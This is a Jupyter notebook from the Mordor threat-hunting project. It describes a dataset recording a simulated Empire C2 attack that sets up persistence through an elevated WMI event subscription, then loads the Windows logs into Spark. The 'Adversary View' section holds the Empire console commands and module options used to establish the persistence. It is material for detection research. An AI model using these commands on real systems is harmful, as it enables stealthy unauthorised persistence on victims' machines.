{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Elevated WMI Subscription"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518184306 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 19/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries leveraging WMI subscriptions for persistence."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: TKV35P8X) > usemodule persistence/elevated/wmi*\n",
    "(Empire: powershell/persistence/elevated/wmi) > info\n",
    "\n",
    "              Name: Invoke-WMI\n",
    "            Module: powershell/persistence/elevated/wmi\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @mattifestation\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Persist a stager (or script) using a permanent WMI\n",
    "  subscription. This has a difficult detection/removal rating.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/mattifestation/PowerSploit/blob/master/Pe\n",
    "  rsistence/Persistence.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name        Required    Value                     Description\n",
    "  ----        --------    -------                   -----------\n",
    "  DailyTime   False                                 Daily time to trigger the script        \n",
    "                                                    (HH:mm).                                \n",
    "  ProxyCreds  False       default                   Proxy credentials                       \n",
    "                                                    ([domain\\]username:password) to use for \n",
    "                                                    request (default, none, or other).      \n",
    "  ExtFile     False                                 Use an external file for the payload    \n",
    "                                                    instead of a stager.                    \n",
    "  Cleanup     False                                 Switch. Cleanup the trigger and any     \n",
    "                                                    script from specified location.         \n",
    "  Agent       True        TKV35P8X                  Agent to run module on.                 \n",
    "  Listener    True                                  Listener to use.                        \n",
    "  SubName     True        Updater                   Name to use for the event subscription. \n",
    "  Proxy       False       default                   Proxy to use for request (default, none,\n",
    "                                                    or other).                              \n",
    "  AtStartup   False       True                      Switch. Trigger script (within 5        \n",
    "                                                    minutes) of system startup.             \n",
    "  UserAgent   False       default                   User-agent string to use for the staging\n",
    "                                                    request (default, none, or other).      \n",
    "  FailedLogon False                                 Trigger script with a failed logon      \n",
    "                                                    attempt from a specified user           \n",
    "\n",
    "(Empire: powershell/persistence/elevated/wmi) > set Listener https\n",
    "(Empire: powershell/persistence/elevated/wmi) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked TKV35P8X to run TASK_CMD_WAIT\n",
    "[*] Agent TKV35P8X tasked with task ID 3\n",
    "[*] Tasked agent TKV35P8X to run module powershell/persistence/elevated/wmi\n",
    "(Empire: powershell/persistence/elevated/wmi) > WMI persistence established using listener https with OnStartup WMI subsubscription trigger.\n",
    "\n",
    "(Empire: powershell/persistence/elevated/wmi) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/persistence/empire_elevated_wmi.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
